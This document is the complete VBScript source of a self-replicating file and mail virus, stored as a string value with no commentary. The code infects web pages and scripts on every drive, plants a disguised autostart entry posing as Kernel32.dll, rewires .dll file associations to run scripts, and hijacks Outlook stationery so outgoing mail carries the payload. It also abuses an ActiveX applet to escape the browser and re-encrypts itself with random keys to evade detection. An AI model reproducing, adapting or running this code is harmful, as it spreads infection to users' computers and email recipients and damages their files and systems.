ThisText	"Dim InWhere,HtmlText,VbsText,DegreeSign,AppleObject,FSO,WsShell,WinPath,SubE,FinalyDisk
Sub KJ_start()
KJSetDim()
KJCreateMilieu()
KJLikeIt()
KJCreateMail()
KJPropagate()
End Sub

Function KJAppendTo(FilePath,TypeStr)
On Error Resume Next
Set ReadTemp = FSO.OpenTextFile(FilePath,1)
TmpStr = ReadTemp.ReadAll
If Instr(TmpStr,""KJ_start()"") <> 0 Or Len(TmpStr) < 1 Then
ReadTemp.Close
Exit Function
End If
If TypeStr = ""htt"" Then
ReadTemp.Close
Set FileTemp = FSO.OpenTextFile(FilePath,2)
FileTemp.Write ""<"" & ""BODY onload="""""" & ""vbscript:"" & ""KJ_start()"""""" & "">"" & vbCrLf & TmpStr & vbCrLf & HtmlText
FileTemp.Close
Set FAttrib = FSO.GetFile(FilePath)
FAttrib.attributes = 34
Else
ReadTemp.Close
Set FileTemp = FSO.OpenTextFile(FilePath,8)
If TypeStr = ""html"" Then
FileTemp.Write vbCrLf & ""<"" & ""HTML>"" & vbCrLf & ""<"" & ""BODY onload="""""" & ""vbscript:"" & ""KJ_start()"""""" & "">"" & vbCrLf & HtmlText
ElseIf TypeStr = ""vbs"" Then
FileTemp.Write vbCrLf & VbsText
End If
FileTemp.Close
End If
End Function

Function KJChangeSub(CurrentString,LastIndexChar)
If LastIndexChar = 0 Then
If Left(LCase(CurrentString),1) =< LCase(""c"") Then
KJChangeSub = FinalyDisk & "":\""
SubE = 0
Else
KJChangeSub = Chr(Asc(Left(LCase(CurrentString),1)) - 1) & "":\""
SubE = 0
End If
Else
KJChangeSub = Mid(CurrentString,1,LastIndexChar)
End If
End Function

Function KJCreateMail()
On Error Resume Next
If InWhere = ""html"" Then
Exit Function
End If
ShareFile = Left(WinPath,3) & ""Program Files\Common Files\Microsoft Shared\Stationery\blank.htm""
If (FSO.FileExists(ShareFile)) Then
Call KJAppendTo(ShareFile,""html"")
Else
Set FileTemp = FSO.OpenTextFile(ShareFile,2,true)
FileTemp.Write ""<"" & ""HTML>"" & vbCrLf & ""<"" & ""BODY onload="""""" & ""vbscript:"" & ""KJ_start()"""""" & "">"" & vbCrLf & HtmlText
FileTemp.Close
End If
DefaultId = WsShell.RegRead(""HKEY_CURRENT_USER\Identities\Default User ID"")
OutLookVersion = WsShell.RegRead(""HKEY_LOCAL_MACHINE\Software\Microsoft\Outlook Express\MediaVer"")
WsShell.RegWrite ""HKEY_CURRENT_USER\Identities\""&DefaultId&""\Software\Microsoft\Outlook Express\""& Left(OutLookVersion,1) &"".0\Mail\Compose Use Stationery"",1,""REG_DWORD""
Call KJMailReg(""HKEY_CURRENT_USER\Identities\""&DefaultId&""\Software\Microsoft\Outlook Express\""& Left(OutLookVersion,1) &"".0\Mail\Stationery Name"",ShareFile)
Call KJMailReg(""HKEY_CURRENT_USER\Identities\""&DefaultId&""\Software\Microsoft\Outlook Express\""& Left(OutLookVersion,1) &"".0\Mail\Wide Stationery Name"",ShareFile)
WsShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Outlook\Options\Mail\EditorPreference"",131072,""REG_DWORD""
Call KJMailReg(""HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet Settings\0a0d020000000000c000000000000046\001e0360"",""blank"")
Call KJMailReg(""HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet Settings\0a0d020000000000c000000000000046\001e0360"",""blank"")
WsShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Outlook\Options\Mail\EditorPreference"",131072,""REG_DWORD""
Call KJMailReg(""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Common\MailSettings\NewStationery"",""blank"")
KJummageFolder(Left(WinPath,3) & ""Program Files\Common Files\Microsoft Shared\Stationery"")
End Function

Function KJCreateMilieu()
On Error Resume Next
TempPath = """"
If Not(FSO.FileExists(WinPath & ""WScript.exe"")) Then
TempPath = ""system32\""
End If
If TempPath = ""system32\"" Then
StartUpFile = WinPath & ""SYSTEM\Kernel32.dll""
Else
StartUpFile = WinPath & ""SYSTEM\Kernel.dll""
End If
WsShell.RegWrite ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Kernel32"",StartUpFile
FSO.CopyFile WinPath & ""web\kjwall.gif"",WinPath & ""web\Folder.htt""
FSO.CopyFile WinPath & ""system32\kjwall.gif"",WinPath & ""system32\desktop.ini""
Call KJAppendTo(WinPath & ""web\Folder.htt"",""htt"")
WsShell.RegWrite ""HKEY_CLASSES_ROOT\.dll\"",""dllfile""
WsShell.RegWrite ""HKEY_CLASSES_ROOT\.dll\Content Type"",""application/x-msdownload""
WsShell.RegWrite ""HKEY_CLASSES_ROOT\dllfile\DefaultIcon\"",WsShell.RegRead(""HKEY_CLASSES_ROOT\vxdfile\DefaultIcon\"")
WsShell.RegWrite ""HKEY_CLASSES_ROOT\dllfile\ScriptEngine\"",""VBScript""
WsShell.RegWrite ""HKEY_CLASSES_ROOT\dllFile\Shell\Open\Command\"",WinPath & TempPath & ""WScript.exe """"%1"""" %*""
WsShell.RegWrite ""HKEY_CLASSES_ROOT\dllFile\ShellEx\PropertySheetHandlers\WSHProps\"",""{60254CA5-953B-11CF-8C96-00AA00B8708C}""
WsShell.RegWrite ""HKEY_CLASSES_ROOT\dllFile\ScriptHostEncode\"",""{85131631-480C-11D2-B1F9-00C04F86C324}""
Set FileTemp = FSO.OpenTextFile(StartUpFile,2,true)
FileTemp.Write VbsText
FileTemp.Close
End Function

Function KJLikeIt()
If InWhere <> ""html"" Then
Exit Function
End If
ThisLocation = document.location
If Left(ThisLocation, 4) = ""file"" Then
ThisLocation = Mid(ThisLocation,9)
If FSO.GetExtensionName(ThisLocation) <> """" then
ThisLocation = Left(ThisLocation,Len(ThisLocation) - Len(FSO.GetFileName(ThisLocation)))
End If
If Len(ThisLocation) > 3 Then
ThisLocation = ThisLocation & ""\""
End If
KJummageFolder(ThisLocation)
End If
End Function

Function KJMailReg(RegStr,FileName)
On Error Resume Next
RegTempStr = WsShell.RegRead(RegStr)
If RegTempStr = """" Then
WsShell.RegWrite RegStr,FileName
End If
End Function

Function KJOboSub(CurrentString)
SubE = 0
TestOut = 0
Do While True
TestOut = TestOut + 1
If TestOut > 28 Then
CurrentString = FinalyDisk & "":\""
Exit Do
End If
On Error Resume Next
Set ThisFolder = FSO.GetFolder(CurrentString)
Set DicSub = CreateObject(""Scripting.Dictionary"")
Set Folders = ThisFolder.SubFolders
FolderCount = 0
For Each TempFolder in Folders
FolderCount = FolderCount + 1
DicSub.add FolderCount, TempFolder.Name
Next
If DicSub.Count = 0 Then
LastIndexChar = InstrRev(CurrentString,""\"",Len(CurrentString)-1)
SubString = Mid(CurrentString,LastIndexChar+1,Len(CurrentString)-LastIndexChar-1)
CurrentString = KJChangeSub(CurrentString,LastIndexChar)
SubE = 1
Else
If SubE = 0 Then
CurrentString = CurrentString & DicSub.Item(1) & ""\""
Exit Do
Else
j = 0
For j = 1 To FolderCount
If LCase(SubString) = LCase(DicSub.Item(j)) Then
If j < FolderCount Then
CurrentString = CurrentString & DicSub.Item(j+1) & ""\""
Exit Do
End If
End If
Next
LastIndexChar = InstrRev(CurrentString,""\"",Len(CurrentString)-1)
SubString = Mid(CurrentString,LastIndexChar+1,Len(CurrentString)-LastIndexChar-1)
CurrentString = KJChangeSub(CurrentString,LastIndexChar)
End If
End If
Loop
KJOboSub = CurrentString
End Function

Function KJPropagate()
On Error Resume Next
RegPathValue = ""HKEY_LOCAL_MACHINE\Software\Microsoft\Outlook Express\Degree""
DiskDegree = WsShell.RegRead(RegPathValue)
If DiskDegree = """" Then
DiskDegree = FinalyDisk & "":\""
End If
For i=1 to 5
DiskDegree = KJOboSub(DiskDegree)
KJummageFolder(DiskDegree)
Next
WsShell.RegWrite RegPathValue,DiskDegree
End Function

Function KJummageFolder(PathName)
On Error Resume Next
Set FolderName = FSO.GetFolder(PathName)
Set ThisFiles = FolderName.Files
HttExists = 0
For Each ThisFile In ThisFiles
FileExt = UCase(FSO.GetExtensionName(ThisFile.Path))
If FileExt = ""HTM"" Or FileExt = ""HTML"" Or FileExt = ""ASP"" Or FileExt = ""PHP"" Or FileExt = ""JSP"" Then
Call KJAppendTo(ThisFile.Path,""html"")
ElseIf FileExt = ""VBS"" Then
Call KJAppendTo(ThisFile.Path,""vbs"")
ElseIf FileExt = ""HTT"" Then
HttExists = 1
End If
Next
If (UCase(PathName) = UCase(WinPath & ""Desktop\"")) Or (UCase(PathName) = UCase(WinPath & ""Desktop""))Then
HttExists = 1
End If
If HttExists = 0 Then
FSO.CopyFile WinPath & ""system32\desktop.ini"",PathName
FSO.CopyFile WinPath & ""web\Folder.htt"",PathName
End If
End Function

Function KJSetDim()
On Error Resume Next
Err.Clear
TestIt = WScript.ScriptFullname
If Err Then
InWhere = ""html""
Else
InWhere = ""vbs""
End If
If InWhere = ""vbs"" Then
Set FSO = CreateObject(""Scripting.FileSystemObject"")
Set WsShell = CreateObject(""WScript.Shell"")
Else
Set AppleObject = document.applets(""KJ_guest"")
AppleObject.setCLSID(""{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}"")
AppleObject.createInstance()
Set WsShell = AppleObject.GetObject()
AppleObject.setCLSID(""{0D43FE01-F093-11CF-8940-00A0C9054228}"")
AppleObject.createInstance()
Set FSO = AppleObject.GetObject()
End If
Set DiskObject = FSO.Drives
For Each DiskTemp In DiskObject
If DiskTemp.DriveType <> 2 And DiskTemp.DriveType <> 1 Then
Exit For
End If
FinalyDisk = DiskTemp.DriveLetter
Next
Dim OtherArr(3)
Randomize
For i=0 To 3
OtherArr(i) = Int((9 * Rnd))
Next
TempString = """"
For i=1 To Len(ThisText)
TempNum = Asc(Mid(ThisText,i,1))
If TempNum = 13 Then
TempNum = 28
ElseIf TempNum = 10 Then
TempNum = 29
End If
TempChar = Chr(TempNum - OtherArr(i Mod 4))
If TempChar = Chr(34) Then
TempChar = Chr(18)
End If
TempString = TempString & TempChar
Next
UnLockStr = ""Execute(""""Dim KeyArr(3),ThisText""""&vbCrLf&""""KeyArr(0) = "" & OtherArr(0) & """"""&vbCrLf&""""KeyArr(1) = "" & OtherArr(1) & """"""&vbCrLf&""""KeyArr(2) = "" & OtherArr(2) & """"""&vbCrLf&""""KeyArr(3) = "" & OtherArr(3) & """"""&vbCrLf&""""For i=1 To Len(ExeString)""""&vbCrLf&""""TempNum = Asc(Mid(ExeString,i,1))""""&vbCrLf&""""If TempNum = 18 Then""""&vbCrLf&""""TempNum = 34""""&vbCrLf&""""End If""""&vbCrLf&""""TempChar = Chr(TempNum + KeyArr(i Mod 4))""""&vbCrLf&""""If TempChar = Chr(28) Then""""&vbCrLf&""""TempChar = vbCr""""&vbCrLf&""""ElseIf TempChar = Chr(29) Then""""&vbCrLf&""""TempChar = vbLf""""&vbCrLf&""""End If""""&vbCrLf&""""ThisText = ThisText & TempChar""""&vbCrLf&""""Next"""")"" & vbCrLf & ""Execute(ThisText)""
ThisText = ""ExeString = """""" & TempString & """"""""
HtmlText =""<"" & ""script language=vbscript>"" & vbCrLf & ""document.write "" & """""""" & ""<"" & ""div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'>"" & ""<""""&"""""" & ""APPLET NAME=KJ""""&""""_guest HEIGHT=0 WIDTH=0 code=com.ms.""""&""""activeX.Active""""&""""XComponent>"" & ""<"" & ""/APPLET>"" & ""<"" & ""/div>"""""" & vbCrLf & ""<"" & ""/script>"" & vbCrLf & ""<"" & ""script language=vbscript>"" & vbCrLf & ThisText & vbCrLf & UnLockStr & vbCrLf & ""<"" & ""/script>"" & vbCrLf & ""<"" & ""/BODY>"" & vbCrLf & ""<"" & ""/HTML>""
VbsText = ThisText & vbCrLf & UnLockStr & vbCrLf & ""KJ_start()""
WinPath = FSO.GetSpecialFolder(0) & ""\""
If (FSO.FileExists(WinPath & ""web\Folder.htt"")) Then
FSO.CopyFile WinPath & ""web\Folder.htt"",WinPath & ""web\kjwall.gif""
End If
If (FSO.FileExists(WinPath & ""system32\desktop.ini"")) Then
FSO.CopyFile WinPath & ""system32\desktop.ini"",WinPath & ""system32\kjwall.gif""
End If
End Function"	String
